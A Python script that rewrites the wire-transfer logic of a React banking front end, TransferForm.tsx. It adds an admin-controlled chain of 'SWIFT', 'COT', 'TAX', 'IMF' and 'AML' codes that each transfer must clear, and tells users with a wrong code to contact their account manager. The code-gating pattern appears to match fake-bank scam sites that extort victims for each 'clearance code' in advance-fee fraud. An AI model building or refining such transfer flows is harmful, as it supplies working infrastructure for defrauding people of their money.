import re

with open('src/components/TransferForm.tsx', 'r') as f:
    content = f.read()

# Replace the Next logic and sequence logic
replacement = """
  const handleNext = () => {
    if (!amount || isNaN(Number(amount)) || Number(amount) <= 0) {
      setError('Please enter a valid amount.');
      return;
    }
    if (!account || Number(amount) > account.balance) {
      setError('Insufficient funds.');
      return;
    }
    if (!recipient.name || !recipient.account) {
      setError('Please fill in recipient details.');
      return;
    }
    setError('');
    
    if (type === 'wire') {
       const nextStep = getNextStep(1);
       setStep(nextStep);
       setCurrentCodeInput('');
    } else {
      setStep(3);
    }
  };

  const getNextStep = (current: string | number): string | number => {
    if (type !== 'wire') return 3;
    const seq = ['swift', 'cot', 'tax', 'imf', 'aml'];
    const enabled = seq.filter(code => {
       if (code === 'swift') return adminSettings.requireSwift;
       if (code === 'cot') return adminSettings.requireCot;
       if (code === 'tax') return adminSettings.requireTax;
       if (code === 'imf') return adminSettings.requireImf;
       if (code === 'aml') return adminSettings.requireAml;
       return false;
    });
    
    if (current === 1) return enabled.length > 0 ? enabled[0] : 3;
    
    const idx = enabled.indexOf(current as string);
    if (idx === -1 || idx === enabled.length - 1) return 3;
    return enabled[idx + 1];
  };

  const getPrevStep = (current: string | number): string | number => {
    if (type !== 'wire') return 1;
    const seq = ['swift', 'cot', 'tax', 'imf', 'aml'];
    const enabled = seq.filter(code => {
       if (code === 'swift') return adminSettings.requireSwift;
       if (code === 'cot') return adminSettings.requireCot;
       if (code === 'tax') return adminSettings.requireTax;
       if (code === 'imf') return adminSettings.requireImf;
       if (code === 'aml') return adminSettings.requireAml;
       return false;
    });
    
    if (current === 3) return enabled.length > 0 ? enabled[enabled.length - 1] : 1;
    
    const idx = enabled.indexOf(current as string);
    if (idx <= 0) return 1;
    return enabled[idx - 1];
  };

  const verifySingleCode = (codeName: string) => {
    if (!account) return;
    const actualCode = account.codes[codeName as keyof typeof account.codes];
    
    if (currentCodeInput !== actualCode) {
      setError(`Invalid ${codeName.toUpperCase()} code. Please contact your account manager.`);
      return;
    }
    
    setError('');
    setCurrentCodeInput('');
    setStep(getNextStep(codeName));
  };
"""

content = re.sub(
    r'  const handleNext = \(\) => \{[\s\S]*?verifySingleCode = \(codeName: string, nextStep: string \| number\) => \{[\s\S]*?setStep\(nextStep\);\n  \};',
    replacement.strip(),
    content
)

content = content.replace(
    '''onClick={() => setStep(step === 'swift' ? 1 : step === 'cot' ? 'swift' : step === 'tax' ? 'cot' : step === 'imf' ? 'tax' : 'imf')}''',
    '''onClick={() => setStep(getPrevStep(step))}'''
)

content = content.replace(
    '''const nextMap: Record<string, string | number> = {
                    swift: 'cot',
                    cot: 'tax',
                    tax: 'imf',
                    imf: 'aml',
                    aml: 3
                  };
                  verifySingleCode(step as string, nextMap[step as string]);''',
    '''verifySingleCode(step as string);'''
)

content = content.replace(
    '''onClick={() => setStep(requiresCodes ? 'aml' : 1)}''',
    '''onClick={() => setStep(getPrevStep(3))}'''
)

content = content.replace(
    '''const requiresCodes = type === 'wire' && adminSettings.requireWireCodes;''',
    ''''''
)


with open('src/components/TransferForm.tsx', 'w') as f:
    f.write(content)

